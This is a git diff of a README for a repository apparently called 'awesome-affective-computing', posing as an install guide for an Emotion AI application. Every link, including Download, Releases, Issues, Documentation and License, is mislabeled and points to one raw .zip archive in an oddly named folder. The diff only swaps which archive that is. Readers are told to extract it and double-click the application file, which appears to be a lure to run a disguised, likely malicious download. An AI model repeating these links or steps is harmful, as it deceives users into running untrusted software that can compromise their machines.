@@ -1,6 +1,6 @@
 # 🎉 awesome-affective-computing - Explore the Power of Emotion AI
 
-[![Download Now](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip)
+[![Download Now](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will help you download and run the software easily, even if you have 
 
 To get started with the application, simply visit the following page:
 
-[Download from Releases](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip)
+[Download from Releases](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip)
 
 On this page, you’ll find the latest versions available for download. Here’s how to navigate it:
 
@@ -42,7 +42,7 @@ Once you have downloaded the file, follow these straightforward steps to install
 
    - If you downloaded a `.zip` file, you need to extract it first. Right-click the file and choose **Extract All**. Follow the on-screen instructions.
    
-2. Once extracted, look for the application file (e.g., `https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip`).
+2. Once extracted, look for the application file (e.g., `https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip`).
 
 3. Double-click the application file to start the installation.
 
@@ -72,7 +72,7 @@ To get familiar with the features, take a moment to explore the various sections
 
 ## 📚 Support & Contribution
 
-If you encounter any issues, feel free to reach out through the [Issues](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip) section of this repository. You can also contribute to the project by sharing resources or suggesting improvements. Every contribution is valuable.
+If you encounter any issues, feel free to reach out through the [Issues](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip) section of this repository. You can also contribute to the project by sharing resources or suggesting improvements. Every contribution is valuable.
 
 ## 🌟 Join the Community
 
@@ -80,9 +80,9 @@ Join a growing community of enthusiasts in Affective Computing and Emotion AI. S
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip)
-- [Discussion Forum](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip)
-- [License Information](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip)
+- [Documentation](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip)
+- [Discussion Forum](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip)
+- [License Information](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip)
 
 Make sure to explore these resources for a thorough understanding of the application and its capabilities.
 
@@ -90,4 +90,4 @@ Make sure to explore these resources for a thorough understanding of the applica
 
 Thank you for choosing **awesome-affective-computing**. Your journey into the world of Emotion AI begins here. If you have any questions, don’t hesitate to ask for help. Enjoy exploring the insights that emotion and affective computing can provide!
 
-Remember to check back on the [Releases page](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/awesome_computing_affective_v3.5-beta.1.zip) for future updates and new features!
+Remember to check back on the [Releases page](https://github.com/Abdulrehman-khan/awesome-affective-computing/raw/refs/heads/main/unreadily/computing-awesome-affective-2.4.zip) for future updates and new features!
